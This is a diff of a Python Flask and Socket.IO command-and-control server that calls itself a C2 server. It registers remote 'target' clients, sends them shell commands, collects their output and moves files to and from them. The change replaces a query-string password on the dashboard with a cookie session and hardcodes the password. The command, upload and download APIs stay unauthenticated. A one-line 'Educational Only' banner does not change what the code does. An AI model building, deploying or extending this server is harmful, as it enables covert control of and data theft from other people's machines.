@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-C2 SERVER - Secured (No Public Dashboard)
+C2 SERVER - Clean & Simple
 Features: Multiple clients, Command execution, File upload/download
 """
 
-from flask import Flask, request, jsonify, send_file, render_template_string
+from flask import Flask, request, jsonify, send_file
 from flask_socketio import SocketIO, emit, join_room
 from flask_cors import CORS
 import os
@@ -16,7 +16,6 @@ from datetime import datetime
 import secrets
 import threading
 from collections import defaultdict
-from functools import wraps
 
 app = Flask(__name__)
 CORS(app)
@@ -31,191 +30,333 @@ os.makedirs('downloads', exist_ok=True)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
 # In-memory storage
-clients = {}
-client_sockets = {}
-command_results = {}
-pending_commands = defaultdict(list)
+clients = {}  # {client_id: {info}}
+client_sockets = {}  # {client_id: socket_id}
+command_results = {}  # {command_id: result}
+pending_commands = defaultdict(list)  # {client_id: [commands]}
+authenticated_sessions = {}  # {session_id: expiry}
 
-# Password for dashboard access
+# Dashboard password
 DASHBOARD_PASSWORD = "C2RICARDO"
 
 print("""
 ╔══════════════════════════════════════════════════════════════╗
-║                   C2 SERVER v2.0 SECURED                     ║
-║              No Public Dashboard • Password Protected        ║
+║                      C2 SERVER v1.0                          ║
+║            Simple • Fast • Educational Only                  ║
 ╚══════════════════════════════════════════════════════════════╝
 """)
-
-# ============= PASSWORD PROTECTION =============
-
-def check_password():
-    """Check if password is correct"""
-    password = request.args.get('password', '') or request.form.get('password', '')
-    auth_header = request.headers.get('Authorization', '')
-    
-    # Check query param, form data, or Bearer token
-    if password == DASHBOARD_PASSWORD:
-        return True
-    if auth_header == f"Bearer {DASHBOARD_PASSWORD}":
-        return True
-    return False
-
-def require_password(f):
-    """Decorator to require password for routes"""
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if not check_password():
-            return jsonify({'error': 'Unauthorized', 'message': 'Invalid or missing password'}), 401
-        return f(*args, **kwargs)
-    return decorated_function
 
 # ============= WEB ROUTES =============
 
 @app.route('/')
 def index():
-    """Locked homepage - shows nothing publicly"""
-    # Check if password provided
-    if check_password():
-        html = f"""
-<!DOCTYPE html>
-<html>
-<head>
-    <title>C2 Server - Secured</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{
-            font-family: 'Consolas', monospace;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            color: #00ff00;
-            padding: 20px;
-            min-height: 100vh;
-        }}
-        .container {{ max-width: 1200px; margin: 0 auto; }}
-        h1 {{ text-align: center; margin: 20px 0; text-shadow: 0 0 10px #00ff00; }}
-        .stats {{
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin: 30px 0;
-        }}
-        .stat-box {{
-            background: rgba(0, 255, 0, 0.1);
-            border: 2px solid #00ff00;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-        }}
-        .stat-number {{ font-size: 3em; font-weight: bold; }}
-        .stat-label {{ margin-top: 10px; opacity: 0.8; }}
-        .info {{
-            background: rgba(0, 255, 0, 0.05);
-            border: 1px solid #00ff00;
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-        }}
-        .info h3 {{ margin-bottom: 15px; }}
-        code {{ color: #00ff00; background: rgba(0, 0, 0, 0.5); padding: 2px 6px; border-radius: 3px; }}
-        .pulse {{ animation: pulse 2s infinite; }}
-        @keyframes pulse {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.5; }} }}
-        .locked {{ color: #ff0000; }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🔓 C2 SERVER UNLOCKED <span class="pulse">●</span></h1>
-        
-        <div class="stats">
-            <div class="stat-box">
-                <div class="stat-number" id="total">0</div>
-                <div class="stat-label">Total Clients</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number" id="online">0</div>
-                <div class="stat-label">Online Now</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number" id="commands">0</div>
-                <div class="stat-label">Commands Executed</div>
-            </div>
-        </div>
-        
-        <div class="info">
-            <h3>🎮 USE CONSOLE TO CONTROL</h3>
-            <p>Run: <code>python console.py</code></p>
-            <p>Dashboard is for monitoring only - use console for commands</p>
-        </div>
-    </div>
+    """Protected dashboard"""
+    # Check if authenticated
+    session_id = request.cookies.get('c2_session')
     
-    <script>
-        async function updateStats() {{
-            try {{
-                const res = await fetch('/api/stats?password={DASHBOARD_PASSWORD}');
-                const data = await res.json();
-                document.getElementById('total').textContent = data.total || 0;
-                document.getElementById('online').textContent = data.online || 0;
-                document.getElementById('commands').textContent = data.commands || 0;
-            }} catch(e) {{}}
-        }}
-        updateStats();
-        setInterval(updateStats, 3000);
-    </script>
-</body>
-</html>
-        """
-        return html
+    if session_id and session_id in authenticated_sessions:
+        if authenticated_sessions[session_id] > time.time():
+            # Show dashboard
+            return dashboard_html()
+        else:
+            # Session expired
+            del authenticated_sessions[session_id]
+    
+    # Show login
+    return login_html()
+
+@app.route('/auth', methods=['POST'])
+def authenticate():
+    """Authenticate user"""
+    password = request.form.get('password', '')
+    
+    if password == DASHBOARD_PASSWORD:
+        # Create session
+        session_id = secrets.token_hex(32)
+        authenticated_sessions[session_id] = time.time() + 3600  # 1 hour
+        
+        # Redirect to dashboard
+        response = app.make_response(dashboard_html())
+        response.set_cookie('c2_session', session_id, max_age=3600, httponly=True)
+        return response
     else:
-        # Show locked page
         return """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Server Running</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: monospace;
-            background: #000;
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-        .status {
-            text-align: center;
-            font-size: 14px;
-            opacity: 0.3;
-        }
-        .dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #333;
-            border-radius: 50%;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.6; }
-        }
-    </style>
-</head>
-<body>
-    <div class="status">
-        <span class="dot"></span>
-        <div style="margin-top: 10px;">server running</div>
-    </div>
-</body>
-</html>
-        """, 200
+        <html>
+        <head>
+            <title>Access Denied</title>
+            <style>
+                body {
+                    font-family: 'Consolas', monospace;
+                    background: #000;
+                    color: #ff0000;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    height: 100vh;
+                    margin: 0;
+                }
+                .error { text-align: center; }
+                h1 { font-size: 3em; text-shadow: 0 0 10px #ff0000; }
+                a { color: #ff0000; text-decoration: none; }
+            </style>
+        </head>
+        <body>
+            <div class="error">
+                <h1>⛔ ACCESS DENIED</h1>
+                <p>Invalid password</p>
+                <p><a href="/">← Try again</a></p>
+            </div>
+        </body>
+        </html>
+        """
+
+def login_html():
+    """Login page"""
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>C2 Server - Login</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+                font-family: 'Consolas', monospace;
+                background: #000;
+                color: #00ff00;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+            }
+            .login-box {
+                background: rgba(0, 255, 0, 0.05);
+                border: 2px solid #00ff00;
+                padding: 40px;
+                border-radius: 10px;
+                text-align: center;
+                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            }
+            h1 {
+                font-size: 2em;
+                margin-bottom: 10px;
+                text-shadow: 0 0 10px #00ff00;
+            }
+            .subtitle {
+                color: #00cc00;
+                margin-bottom: 30px;
+                font-size: 0.9em;
+            }
+            input[type="password"] {
+                width: 300px;
+                padding: 15px;
+                font-family: 'Consolas', monospace;
+                font-size: 1.1em;
+                background: #000;
+                border: 2px solid #00ff00;
+                color: #00ff00;
+                border-radius: 5px;
+                margin-bottom: 20px;
+                text-align: center;
+            }
+            input[type="password"]:focus {
+                outline: none;
+                box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+            }
+            button {
+                width: 300px;
+                padding: 15px;
+                font-family: 'Consolas', monospace;
+                font-size: 1.1em;
+                background: #00ff00;
+                color: #000;
+                border: none;
+                border-radius: 5px;
+                cursor: pointer;
+                font-weight: bold;
+            }
+            button:hover {
+                background: #00cc00;
+                box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            }
+            .warning {
+                margin-top: 20px;
+                font-size: 0.8em;
+                color: #ff6b6b;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <h1>🔒 C2 SERVER</h1>
+            <p class="subtitle">Authorized Access Only</p>
+            <form method="POST" action="/auth">
+                <input type="password" name="password" placeholder="Enter Password" required autofocus>
+                <br>
+                <button type="submit">AUTHENTICATE</button>
+            </form>
+            <p class="warning">⚠️ Unauthorized access is prohibited</p>
+        </div>
+    </body>
+    </html>
+    """
+
+def dashboard_html():
+    """Simple protected dashboard"""
+    online = sum(1 for c in clients.values() if c.get('online', False))
+    
+    return f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>C2 Server Dashboard</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+            body {{
+                font-family: 'Consolas', monospace;
+                background: #000;
+                color: #00ff00;
+                padding: 20px;
+            }}
+            .container {{ max-width: 1200px; margin: 0 auto; }}
+            .header {{
+                text-align: center;
+                margin-bottom: 30px;
+                padding: 20px;
+                border: 2px solid #00ff00;
+                border-radius: 10px;
+                background: rgba(0, 255, 0, 0.05);
+            }}
+            h1 {{ 
+                font-size: 2em; 
+                margin-bottom: 10px;
+                text-shadow: 0 0 10px #00ff00;
+            }}
+            .status {{ color: #00cc00; font-size: 0.9em; }}
+            .stats {{
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                gap: 20px;
+                margin: 30px 0;
+            }}
+            .stat-box {{
+                background: rgba(0, 255, 0, 0.05);
+                border: 2px solid #00ff00;
+                padding: 20px;
+                border-radius: 10px;
+                text-align: center;
+            }}
+            .stat-number {{ 
+                font-size: 3em; 
+                font-weight: bold;
+                text-shadow: 0 0 10px #00ff00;
+            }}
+            .stat-label {{ margin-top: 10px; color: #00cc00; }}
+            .info {{
+                background: rgba(0, 255, 0, 0.05);
+                border: 2px solid #00ff00;
+                padding: 20px;
+                border-radius: 10px;
+                margin-top: 20px;
+            }}
+            .info h3 {{ 
+                margin-bottom: 15px;
+                font-size: 1.2em;
+            }}
+            .info p {{ 
+                padding: 8px;
+                margin: 5px 0;
+                background: rgba(0, 255, 0, 0.1);
+                border-radius: 5px;
+            }}
+            code {{ 
+                color: #00ff00;
+                background: rgba(0, 0, 0, 0.5);
+                padding: 2px 6px;
+                border-radius: 3px;
+            }}
+            .pulse {{ animation: pulse 2s infinite; }}
+            @keyframes pulse {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.5; }} }}
+            .logout {{
+                text-align: center;
+                margin-top: 30px;
+            }}
+            .logout a {{
+                color: #ff6b6b;
+                text-decoration: none;
+                padding: 10px 20px;
+                border: 2px solid #ff6b6b;
+                border-radius: 5px;
+                display: inline-block;
+            }}
+            .logout a:hover {{
+                background: #ff6b6b;
+                color: #000;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>🛸 C2 SERVER <span class="pulse">●</span></h1>
+                <p class="status">OPERATIONAL • SECURE • PRIVATE</p>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-number" id="total">{len(clients)}</div>
+                    <div class="stat-label">Total Clients</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number" id="online">{online}</div>
+                    <div class="stat-label">Online Now</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number" id="commands">{len(command_results)}</div>
+                    <div class="stat-label">Commands Executed</div>
+                </div>
+            </div>
+            
+            <div class="info">
+                <h3>📋 STATUS</h3>
+                <p>✓ Server is running and accepting connections</p>
+                <p>✓ WebSocket connections enabled</p>
+                <p>✓ File transfer system active</p>
+                <p>✓ Command queue processing</p>
+            </div>
+            
+            <div class="info">
+                <h3>🎮 USAGE</h3>
+                <p>Run console: <code>python console.py</code></p>
+                <p>Run client on target: <code>python client.py &lt;server_url&gt;</code></p>
+                <p>Use console commands to control clients</p>
+            </div>
+            
+            <div class="logout">
+                <a href="/" onclick="document.cookie='c2_session=; Max-Age=0'; return true;">🚪 Logout</a>
+            </div>
+        </div>
+        
+        <script>
+            async function updateStats() {{
+                try {{
+                    const res = await fetch('/api/stats');
+                    const data = await res.json();
+                    document.getElementById('total').textContent = data.total || 0;
+                    document.getElementById('online').textContent = data.online || 0;
+                    document.getElementById('commands').textContent = data.commands || 0;
+                }} catch(e) {{}}
+            }}
+            setInterval(updateStats, 5000);
+        </script>
+    </body>
+    </html>
+    """
 
 @app.route('/api/stats')
-@require_password
 def get_stats():
-    """Get server statistics - requires password"""
+    """Get server statistics"""
     online = sum(1 for c in clients.values() if c.get('online', False))
     return jsonify({
         'total': len(clients),
@@ -226,7 +367,7 @@ def get_stats():
 
 @app.route('/api/clients')
 def api_clients():
-    """Get all clients - NO PASSWORD (needed for console)"""
+    """Get all clients"""
     client_list = []
     for client_id, client in clients.items():
         client_list.append({
@@ -243,7 +384,7 @@ def api_clients():
 
 @app.route('/api/command', methods=['POST'])
 def send_command():
-    """Send command to client - NO PASSWORD (needed for console)"""
+    """Send command to client"""
     data = request.get_json()
     client_id = data.get('client_id')
     command = data.get('command')
@@ -276,7 +417,7 @@ def send_command():
 
 @app.route('/api/result/<cmd_id>')
 def get_result(cmd_id):
-    """Get command result - NO PASSWORD (needed for console)"""
+    """Get command result"""
     if cmd_id in command_results:
         return jsonify(command_results[cmd_id])
     else:
@@ -284,7 +425,7 @@ def get_result(cmd_id):
 
 @app.route('/api/upload', methods=['POST'])
 def upload_file():
-    """Upload file to send to client - NO PASSWORD (needed for console)"""
+    """Upload file to send to client"""
     client_id = request.form.get('client_id')
     destination = request.form.get('destination', '')
     
@@ -327,7 +468,7 @@ def upload_file():
 
 @app.route('/api/download/<file_id>')
 def download_file(file_id):
-    """Download file from server - NO PASSWORD (needed for console)"""
+    """Download file from server"""
     file_path = os.path.join('downloads', file_id)
     if os.path.exists(file_path):
         return send_file(file_path, as_attachment=True)
@@ -339,7 +480,7 @@ def download_file(file_id):
 @socketio.on('connect')
 def handle_connect():
     """Handle client connection"""
-    print(f"[+] Connection: {request.sid}")
+    print(f"[+] New connection: {request.sid}")
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -351,7 +492,8 @@ def handle_disconnect():
                 clients[client_id]['online'] = False
                 clients[client_id]['last_seen'] = time.time()
             del client_sockets[client_id]
-            print(f"[-] Client offline: {client_id[:8]}")
+            print(f"[-] Client disconnected: {client_id}")
+            # Notify consoles
             socketio.emit('client_offline', {'client_id': client_id}, namespace='/')
             break
 
@@ -361,6 +503,7 @@ def handle_register(data):
     client_id = data.get('id')
     
     if not client_id:
+        # Generate ID based on system info
         unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}"
         client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
     
@@ -381,7 +524,7 @@ def handle_register(data):
     client_sockets[client_id] = request.sid
     join_room(client_id)
     
-    print(f"[+] Client online: {client_id[:8]} - {data.get('hostname')} ({data.get('platform')})")
+    print(f"[+] Client registered: {client_id} - {data.get('hostname')} ({data.get('platform')})")
     
     # Send welcome
     emit('welcome', {
@@ -418,8 +561,8 @@ def handle_result(data):
     cmd_id = data.get('command_id')
     client_id = data.get('client_id')
     
-    output_len = len(data.get('output', ''))
-    print(f"[*] Result: {cmd_id[:12]} from {client_id[:8]} ({output_len} chars)")
+    print(f"[*] Result received: {cmd_id} from {client_id}")
+    print(f"    Output length: {len(data.get('output', ''))} chars")
     
     # Store result
     command_results[cmd_id] = {
@@ -432,8 +575,10 @@ def handle_result(data):
         'timestamp': time.time()
     }
     
-    # Notify all consoles
+    # Notify all consoles immediately (no broadcast param, namespace='/' means all)
     socketio.emit('command_result', command_results[cmd_id], namespace='/')
+    
+    # Also notify specific client room
     socketio.emit('result_ready', command_results[cmd_id], room=client_id, namespace='/')
 
 @socketio.on('file_download')
@@ -444,6 +589,7 @@ def handle_file_download(data):
     filedata = data.get('filedata')
     
     if filedata:
+        # Decode and save file
         file_bytes = base64.b64decode(filedata)
         file_path = os.path.join('downloads', file_id)
         
@@ -452,6 +598,7 @@ def handle_file_download(data):
         
         print(f"[+] File received: {filename} ({len(file_bytes)} bytes)")
         
+        # Notify consoles
         socketio.emit('file_ready', {
             'file_id': file_id,
             'filename': filename,
@@ -461,7 +608,7 @@ def handle_file_download(data):
 @socketio.on('console_connect')
 def handle_console_connect(data):
     """Console connects for updates"""
-    print(f"[+] Console connected: {request.sid[:8]}")
+    print(f"[+] Console connected: {request.sid}")
     emit('console_ready', {'message': 'Connected to C2 server'})
 
 # ============= MAIN =============
@@ -469,11 +616,9 @@ def handle_console_connect(data):
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     
-    print(f"[*] Server listening on port {port}")
-    print(f"[*] Dashboard password: {DASHBOARD_PASSWORD}")
-    print(f"[*] Access dashboard: http://localhost:{port}?password={DASHBOARD_PASSWORD}")
-    print(f"[*] API endpoints: Open (no password needed for console)")
-    print(f"[*] Public view: Minimal 'server running' message")
+    print(f"[*] Starting C2 Server on port {port}")
+    print(f"[*] Dashboard: http://0.0.0.0:{port}")
+    print(f"[*] WebSocket: ws://0.0.0.0:{port}/socket.io")
     print()
     
     socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
